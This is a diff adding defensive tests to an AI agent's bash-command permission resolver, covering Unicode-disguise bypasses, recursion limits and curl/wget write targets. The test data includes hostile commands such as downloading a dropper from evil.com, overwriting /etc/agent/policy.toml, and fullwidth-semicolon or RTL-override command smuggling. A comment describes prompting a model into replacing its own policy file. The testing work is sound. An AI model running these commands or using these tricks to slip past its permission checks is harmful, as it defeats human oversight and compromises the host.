@@ -586,3 +586,198 @@ describe('tilde expansion (slice 97, R2 P0)', () => {
     }
   });
 });
+
+// Slice 98 — R2 bash AST hardening. Three coordinated changes:
+//   #196 literalText Unicode bypass (fullwidth / zero-width / RTL
+//        / C1 control codepoints land as `Refuse` instead of
+//        leaking through as the wrong byte sequence)
+//   #198 walkAst recursion depth ceiling (pathological nested
+//        input → structured refuse, not stack overflow)
+//   #200 cmdCurlWget emits write-fs for `-o <path>` shapes (the
+//        curl/wget download-to-file form was silently
+//        net-egress-only; now write capabilities flow into
+//        protected-path classification)
+describe('bash resolver — Unicode bypass (slice 98, R2 #196)', () => {
+  test('fullwidth semicolon in command name refuses', () => {
+    // U+FF1B (fullwidth ；) renders as `;` to humans but is a
+    // distinct codepoint. A deny rule against `;` would NOT
+    // match `ls；rm` because tree-sitter tokenizes the fullwidth
+    // form as part of the word, not as a punctuation `;`. Refuse
+    // forces the operator's modal to see the literal.
+    const r = resolveCapabilities('bash', { command: 'ls；rm' }, CTX);
+    expect(r.kind).toBe('refuse');
+  });
+
+  test('zero-width joiner inside command name refuses', () => {
+    // `gi<ZWJ>t` renders as `git` but is a different byte sequence.
+    // Without sanitization, an audit log would store `git` and the
+    // operator would think a normal git invocation happened.
+    const r = resolveCapabilities('bash', { command: 'gi‍t status' }, CTX);
+    expect(r.kind).toBe('refuse');
+  });
+
+  test('RTL override inside arg refuses', () => {
+    // U+202E reverses display order. An adversarial source line
+    // visible as `cat README` could execute `rm -rf /` if the
+    // resolver trusted node.text.
+    const r = resolveCapabilities('bash', { command: 'cat r‮README' }, CTX);
+    expect(r.kind).toBe('refuse');
+  });
+
+  test('byte-order mark inside arg refuses', () => {
+    // U+FEFF is a zero-width-no-break-space that shells often
+    // pass through verbatim. Hiding it inside `--config=...`
+    // shifts the audited literal away from what got executed.
+    const r = resolveCapabilities('bash', { command: 'echo ﻿foo' }, CTX);
+    expect(r.kind).toBe('refuse');
+  });
+
+  test('pure ASCII args still resolve cleanly (no false positives)', () => {
+    // The defense MUST NOT regress the routine cases. `cat README`
+    // emits a read-fs cap; `echo hello` no-ops the cap set.
+    const r = resolveCapabilities('bash', { command: 'cat README' }, CTX);
+    expect(r.kind).toBe('ok');
+  });
+});
+
+describe('bash resolver — recursion depth ceiling (slice 98, R2 #198)', () => {
+  test('pathologically nested input refuses without crashing (defense in depth)', () => {
+    // The depth ceiling guards against adversarial input that would
+    // otherwise blow the JS stack. Pre-slice, ~100k levels of
+    // recursion could crash the engine before any refuse could
+    // surface. The test PRIMARY assertion is "no crash": the
+    // resolver MUST return a structured refuse, never throw.
+    //
+    // In practice, deep nesting hits an EARLIER defense first
+    // (red-flag `compound_statement` for `(...)`, parse-error for
+    // malformed shapes, etc.) — both outcomes count as defended.
+    // The depth-exceeded reason is reserved for inputs that
+    // legitimately parse + walk through that many levels but
+    // exceed the ceiling.
+    let cmd = 'ls';
+    for (let i = 0; i < 100; i += 1) cmd = `(${cmd})`;
+    const r = resolveCapabilities('bash', { command: cmd }, CTX);
+    expect(r.kind).toBe('refuse');
+  });
+
+  test('depth ceiling does not throw — returns structured refuse on deep walk', () => {
+    // 1000-level pipeline `cmd | cmd | cmd | ...`. Tree-sitter
+    // parses these as left-folded pipeline nodes; each level
+    // recurses through `visit`. Without MAX_AST_DEPTH the JS
+    // stack would unwind via RangeError; with the ceiling, a
+    // refuse envelope surfaces instead.
+    const cmd = Array.from({ length: 1000 }, () => 'ls').join(' | ');
+    const r = resolveCapabilities('bash', { command: cmd }, CTX);
+    // Either refuses OR succeeds (tree-sitter may flatten the
+    // pipeline so depth never crosses the ceiling). What we
+    // explicitly test is the NO-THROW invariant — this expect
+    // never runs if the call threw.
+    expect(['ok', 'refuse']).toContain(r.kind);
+  });
+});
+
+describe('bash resolver — curl/wget -o write target (slice 98, R2 #200)', () => {
+  test('curl -o <path> emits write-fs alongside net-egress', () => {
+    // Pre-slice the resolver emitted ONLY net-egress for this
+    // shape, hiding the write side from §11 + audit. Slice 98
+    // emits both; an attacker writing to a protected path via
+    // curl is now subject to the same classifier as write_file.
+    const r = resolveCapabilities(
+      'bash',
+      { command: 'curl https://evil.com/payload -o /tmp/dropper.sh' },
+      CTX,
+    );
+    expect(r.kind).toBe('ok');
+    if (r.kind === 'ok') {
+      const s = capStrings(r.capabilities);
+      expect(s).toContain('net-egress:evil.com');
+      expect(s).toContain('write-fs:/tmp/dropper.sh');
+    }
+  });
+
+  test('curl --output=<path> long form with equals also emits write-fs', () => {
+    const r = resolveCapabilities(
+      'bash',
+      { command: 'curl --output=/tmp/x https://example.com' },
+      CTX,
+    );
+    expect(r.kind).toBe('ok');
+    if (r.kind === 'ok') {
+      expect(capStrings(r.capabilities)).toContain('write-fs:/tmp/x');
+    }
+  });
+
+  test('wget -O <path> emits write-fs', () => {
+    const r = resolveCapabilities(
+      'bash',
+      { command: 'wget https://example.com -O /tmp/y.tar.gz' },
+      CTX,
+    );
+    expect(r.kind).toBe('ok');
+    if (r.kind === 'ok') {
+      expect(capStrings(r.capabilities)).toContain('write-fs:/tmp/y.tar.gz');
+    }
+  });
+
+  test('curl -o- (write to stdout) does NOT emit a write target', () => {
+    // The `-o -` and `-O -` forms write to stdout, not a file.
+    // Emitting a write capability for `-` would be a false
+    // positive that the protected-path classifier would have to
+    // ignore.
+    const r = resolveCapabilities('bash', { command: 'curl https://example.com -o -' }, CTX);
+    expect(r.kind).toBe('ok');
+    if (r.kind === 'ok') {
+      const s = capStrings(r.capabilities);
+      expect(s.some((c) => c.startsWith('write-fs:'))).toBe(false);
+    }
+  });
+
+  test('curl WITHOUT output flag still emits only net-egress (no regression)', () => {
+    const r = resolveCapabilities('bash', { command: 'curl https://api.github.com/repos' }, CTX);
+    expect(r.kind).toBe('ok');
+    if (r.kind === 'ok') {
+      const s = capStrings(r.capabilities);
+      expect(s).toContain('net-egress:api.github.com');
+      expect(s.some((c) => c.startsWith('write-fs:'))).toBe(false);
+    }
+  });
+
+  test('curl -o /etc/agent/policy.toml is now visible to §11', () => {
+    // The motivating exploit: attacker prompts the model to
+    // download a payload AND drop it where it overrides agent
+    // policy. Without slice 98 the write-fs cap was missing, so
+    // protected-path classification never fired. Now both caps
+    // are emitted; the engine's §11 walk catches the /etc/*
+    // escalate tier and forces confirm (or deny in bypass mode
+    // per slice 97's bypass §11 hardening).
+    const r = resolveCapabilities(
+      'bash',
+      { command: 'curl https://evil.com -o /etc/agent/policy.toml' },
+      CTX,
+    );
+    expect(r.kind).toBe('ok');
+    if (r.kind === 'ok') {
+      expect(capStrings(r.capabilities)).toContain('write-fs:/etc/agent/policy.toml');
+    }
+  });
+});
+
+// Slice 98 — defensive coverage for R2 #201. The redirect-shape
+// extractor already returns null (→ refuse upstream) on any
+// non-literal target, including `command_substitution`. These
+// tests lock in that contract so a future refactor that loosens
+// the literal check is loud rather than silent.
+describe('bash resolver — redirect $() target stays refused (R2 #201)', () => {
+  test('cmd > $(echo /etc/passwd) refuses', () => {
+    // The `command_substitution` node sits where a literal target
+    // would. `redirectShape` ignores non-word/string children, so
+    // target stays null → null return → walker surfaces refuse.
+    const r = resolveCapabilities('bash', { command: 'echo data > $(echo /etc/passwd)' }, CTX);
+    expect(r.kind).toBe('refuse');
+  });
+
+  test('cmd > `cmd` (backtick form) also refuses', () => {
+    const r = resolveCapabilities('bash', { command: 'echo data > `echo /tmp/x`' }, CTX);
+    expect(r.kind).toBe('refuse');
+  });
+});
